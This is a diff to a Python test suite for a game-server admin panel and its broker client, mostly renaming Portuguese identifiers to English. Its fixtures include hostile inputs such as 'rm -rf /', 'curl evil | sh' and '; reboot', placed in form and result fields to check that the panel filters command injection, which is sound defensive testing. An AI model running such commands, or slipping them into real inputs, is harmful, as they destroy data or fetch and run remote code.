@@ -38,7 +38,7 @@ def admin_without_2fa(login):
 
 OP = "a" * 32
 
-JOGOS = [
+GAMES = [
     {"key": "alfa", "name": "Alfa", "app_id": 1001, "ports": ["7001/udp", "7002/udp"],
      "game_port": 7001, "query_port": 7002, "memory_mb": 4096, "cores": 2, "disk_gb": 20,
      "recipes": [], "shiftable": False, "source": "curado", "creatable": True, "reason": ""},
@@ -48,7 +48,7 @@ JOGOS = [
      "reason": "exige conta Steam; use o deploy-game.ps1"},
 ]
 
-INSTANCIA = {
+INSTANCE = {
     "id": 7, "ctid": 300, "ip": "10.0.0.30", "game": "alfa", "name": "Servidor do Zeca",
     "hostname": "alfa-300", "state": "ativa", "detail": "",
     "ports": [{"base": 7001, "numero": 7001, "proto": "udp", "papel": "game"},
@@ -71,12 +71,12 @@ def refusal(message: str, status: int = 409) -> panel.broker_client.BrokerError:
 
 class FakeBroker:
     def __init__(self) -> None:
-        self.jogos = list(JOGOS)
-        self.lista = [dict(INSTANCIA)]
+        self.games = list(GAMES)
+        self.lista = [dict(INSTANCE)]
         self.calls: list[tuple] = []
         self.error: Exception | None = None
-        self.operacoes: list[dict] = [{"state": "ok", "log": "tudo certo\n", "result": RESULTADO}]
-        self.tarefas: list = []
+        self.operations: list[dict] = [{"state": "ok", "log": "tudo certo\n", "result": RESULTADO}]
+        self.tasks: list = []
 
     def _call(self, name: str, *args) -> None:
         self.calls.append((name, *args))
@@ -85,31 +85,31 @@ class FakeBroker:
 
     def catalog(self):
         self._call("catalog")
-        return self.jogos
+        return self.games
 
-    def add_game(self, data, ator):
-        self._call("add_game", data, ator)
+    def add_game(self, data, actor):
+        self._call("add_game", data, actor)
         return {"key": data.get("key")}
 
     def instances(self):
         self._call("instances")
         return self.lista
 
-    def create(self, jogo, name, ator):
-        self._call("create", jogo, name, ator)
+    def create(self, game, name, actor):
+        self._call("create", game, name, actor)
         return {"operation_id": OP, "instance_id": 7}
 
     def operation(self, op_id):
         self._call("operation", op_id)
-        return self.operacoes.pop(0) if len(self.operacoes) > 1 else self.operacoes[0]
+        return self.operations.pop(0) if len(self.operations) > 1 else self.operations[0]
 
-    def deactivate(self, instancia_id, ator):
-        self._call("deactivate", instancia_id, ator)
-        return {"id": instancia_id, "state": "desativada"}
+    def deactivate(self, instance_id, actor):
+        self._call("deactivate", instance_id, actor)
+        return {"id": instance_id, "state": "desativada"}
 
-    def remove(self, instancia_id, confirm, ator, db_only=False):
-        self._call("remove", instancia_id, confirm, ator, db_only)
-        return {"id": instancia_id, "removed": True}
+    def remove(self, instance_id, confirm, actor, db_only=False):
+        self._call("remove", instance_id, confirm, actor, db_only)
+        return {"id": instance_id, "removed": True}
 
     def called(self, name: str) -> list[tuple]:
         return [c for c in self.calls if c[0] == name]
@@ -122,7 +122,7 @@ def broker(monkeypatch, database):
     fake = FakeBroker()
     monkeypatch.setattr(panel, "ALLOW_BROKER", True)
     monkeypatch.setattr(panel, "BROKER_POLL", 0)
-    monkeypatch.setattr(panel, "_fire", fake.tarefas.append)
+    monkeypatch.setattr(panel, "_fire", fake.tasks.append)
     for name in ("catalog", "add_game", "instances", "create", "operation",
                  "deactivate", "remove"):
         monkeypatch.setattr(panel.broker_client, name, getattr(fake, name))
@@ -321,7 +321,7 @@ def test_catalogo_com_broker_fora_do_ar_nao_e_500(admin, broker):
     assert "nao consegui falar com o broker" in response.get_data(as_text=True)
 
 
-FORM_JOGO = {
+GAME_FORM = {
     "key": "meujogo", "name": "Meu Jogo", "app_id": "123456", "ports": "7777/udp, 27016/udp",
     "game_port": "7777", "query_port": "27016", "start_script": "Server.sh",
     "start_args": "-port={PORT}", "memory_mb": "8192", "cores": "4", "disk_gb": "40",
@@ -332,7 +332,7 @@ FORM_JOGO = {
 
 
 def test_novo_jogo_manda_ao_broker_so_dados_ja_convertidos(admin, broker, post):
-    data = {**FORM_JOGO, "recipes": ["wine", "rm -rf /"]}
+    data = {**GAME_FORM, "recipes": ["wine", "rm -rf /"]}
     response = post(admin, "/catalog/new", data)
     assert response.status_code == 302
     (_, sent, actor), = broker.called("add_game")
@@ -349,23 +349,23 @@ def test_novo_jogo_manda_ao_broker_so_dados_ja_convertidos(admin, broker, post):
 def test_novo_jogo_nunca_envia_campo_de_comando(admin, broker, post):
     """O painel so repassa os campos do formulario: nada que o usuario invente na mao
     (pre_install_cmd, por exemplo) chega ao broker."""
-    post(admin, "/catalog/new", {**FORM_JOGO, "pre_install_cmd": "curl evil | sh",
+    post(admin, "/catalog/new", {**GAME_FORM, "pre_install_cmd": "curl evil | sh",
                                      "post_install_cmd": "reboot"})
     (_, sent, _), = broker.called("add_game")
     assert not {"pre_install_cmd", "post_install_cmd"} & set(sent)
 
 
 def test_novo_jogo_deixa_rastro_no_historico(admin, broker, post, database):
-    post(admin, "/catalog/new", FORM_JOGO)
+    post(admin, "/catalog/new", GAME_FORM)
     (line,) = jobs(database)
     assert (line["action"], line["username"], line["status"]) == ("broker-jogo", "chefe", "ok")
     assert line["server_id"] is None
 
 
-@pytest.mark.parametrize("campo", ["app_id", "game_port", "memory_mb", "cores", "disk_gb"])
+@pytest.mark.parametrize("field", ["app_id", "game_port", "memory_mb", "cores", "disk_gb"])
 @pytest.mark.parametrize("lixo", ["abc", "12.5", "-1", "²", "1 2"])
-def test_numero_invalido_nem_chega_ao_broker(admin, broker, post, campo, lixo):
-    response = post(admin, "/catalog/new", {**FORM_JOGO, campo: lixo})
+def test_numero_invalido_nem_chega_ao_broker(admin, broker, post, field, lixo):
+    response = post(admin, "/catalog/new", {**GAME_FORM, field: lixo})
     assert response.status_code == 400
     assert "deve ser um numero" in response.get_data(as_text=True)
     assert broker.called("add_game") == []
@@ -373,7 +373,7 @@ def test_numero_invalido_nem_chega_ao_broker(admin, broker, post, campo, lixo):
 
 def test_recusa_do_broker_volta_ao_formulario_com_o_que_foi_digitado(admin, broker, post):
     broker.error = refusal("start_args: formato invalido", 400)
-    response = post(admin, "/catalog/new", {**FORM_JOGO, "start_args": "; reboot"})
+    response = post(admin, "/catalog/new", {**GAME_FORM, "start_args": "; reboot"})
     html = response.get_data(as_text=True)
     assert response.status_code == 400
     assert "start_args: formato invalido" in html
@@ -413,7 +413,7 @@ def test_criar_abre_um_job_sem_servidor_e_redireciona_para_ele(admin, broker, po
     assert (line["action"], line["status"], line["broker_op"]) == ("broker-criar", "running", OP)
     assert line["server_id"] is None
     assert line["command"] == "alfa: Servidor do Zeca"
-    assert len(broker.tarefas) == 1, "o acompanhamento foi disparado uma vez"
+    assert len(broker.tasks) == 1, "o acompanhamento foi disparado uma vez"
 
 
 def test_criar_recusado_pelo_broker_nao_deixa_job(admin, broker, post, database):
@@ -422,7 +422,7 @@ def test_criar_recusado_pelo_broker_nao_deixa_job(admin, broker, post, database)
     assert response.status_code == 302
     assert "limite de 8 instancias" in admin.get("/instances").get_data(as_text=True)
     assert jobs(database) == []
-    assert broker.tarefas == []
+    assert broker.tasks == []
 
 
 def test_criar_sem_id_de_operacao_nao_deixa_job(admin, broker, post, database, monkeypatch):
@@ -453,7 +453,7 @@ def test_saida_do_job_do_broker_e_so_de_admin(admin, operator, broker, post, dat
 # ------------------------------------------------------------- acompanhar a operacao
 
 def test_o_log_aparece_no_job_enquanto_a_operacao_ainda_roda(broker, database):
-    broker.operacoes = [
+    broker.operations = [
         {"state": "executando", "log": "criando o container 300\n"},
         {"state": "executando", "log": "criando o container 300\ninstalando o jogo\n"},
         {"state": "ok", "log": "criando o container 300\ninstalando o jogo\npronto\n", "result": RESULTADO},
@@ -484,7 +484,7 @@ def test_operacao_ok_cadastra_o_servidor_e_liga_o_job_a_ele(broker, database):
 
 
 def test_operacao_com_erro_fecha_o_job_com_o_log_e_nao_cadastra(broker, database):
-    broker.operacoes = [{"state": "erro", "log": "instalando\nERRO: steamcmd falhou\nreserva liberada\n"}]
+    broker.operations = [{"state": "erro", "log": "instalando\nERRO: steamcmd falhou\nreserva liberada\n"}]
     job_id = new_job(database)
     panel.follow_operation(job_id, OP, sleep=lambda _s: None)
     final = job(database, job_id)
@@ -493,10 +493,10 @@ def test_operacao_com_erro_fecha_o_job_com_o_log_e_nao_cadastra(broker, database
     assert servers(database) == []
 
 
-@pytest.mark.parametrize("campo", ["host", "service"])
-def test_resultado_estranho_do_broker_nao_vira_servidor_e_avisa_que_o_ct_existe(broker, database, campo):
-    bad = {**RESULTADO, campo: "10.0.0.30; rm -rf /" if campo == "host" else "a b.service"}
-    broker.operacoes = [{"state": "ok", "log": "feito\n", "result": bad}]
+@pytest.mark.parametrize("field", ["host", "service"])
+def test_resultado_estranho_do_broker_nao_vira_servidor_e_avisa_que_o_ct_existe(broker, database, field):
+    bad = {**RESULTADO, field: "10.0.0.30; rm -rf /" if field == "host" else "a b.service"}
+    broker.operations = [{"state": "ok", "log": "feito\n", "result": bad}]
     job_id = new_job(database)
     panel.follow_operation(job_id, OP, sleep=lambda _s: None)
     final = job(database, job_id)
@@ -506,7 +506,7 @@ def test_resultado_estranho_do_broker_nao_vira_servidor_e_avisa_que_o_ct_existe(
 
 
 def test_resultado_incompleto_tambem_avisa(broker, database):
-    broker.operacoes = [{"state": "ok", "log": "feito\n", "result": {"name": "x"}}]
+    broker.operations = [{"state": "ok", "log": "feito\n", "result": {"name": "x"}}]
     job_id = new_job(database)
     panel.follow_operation(job_id, OP, sleep=lambda _s: None)
     assert "A instancia foi criada" in job(database, job_id)["output"]
@@ -550,7 +550,7 @@ def test_tempo_esgotado(broker, database, monkeypatch):
 
 def test_tarefa_disparada_pela_rota_faz_o_caminho_inteiro(admin, broker, post, database):
     post(admin, "/instances/new", {"game": "alfa", "name": "Servidor do Zeca"})
-    broker.tarefas[0]()
+    broker.tasks[0]()
     (line,) = jobs(database)
     assert line["status"] == "ok"
     assert servers(database)[0]["broker_id"] == 7
@@ -566,8 +566,8 @@ def test_restart_retoma_o_que_ainda_estava_rodando(broker, database):
         database.execute("INSERT INTO jobs (target, action, status, username, created_at)"
                       " VALUES ('x', 'restart', 'running', 'u', ?)", (panel.now_iso(),))
     assert panel.resume_broker_jobs() == 1
-    assert len(broker.tarefas) == 1
-    broker.tarefas[0]()
+    assert len(broker.tasks) == 1
+    broker.tasks[0]()
     assert job(database, running)["status"] == "ok"
     assert broker.called("operation") == [("operation", "b" * 32)]
 
@@ -576,7 +576,7 @@ def test_broker_desligado_nao_retoma_nada(broker, database, monkeypatch):
     new_job(database)
     monkeypatch.setattr(panel, "ALLOW_BROKER", False)
     assert panel.resume_broker_jobs() == 0
-    assert broker.tarefas == []
+    assert broker.tasks == []
 
 
 # ---------------------------------------------------------- desativar e remover
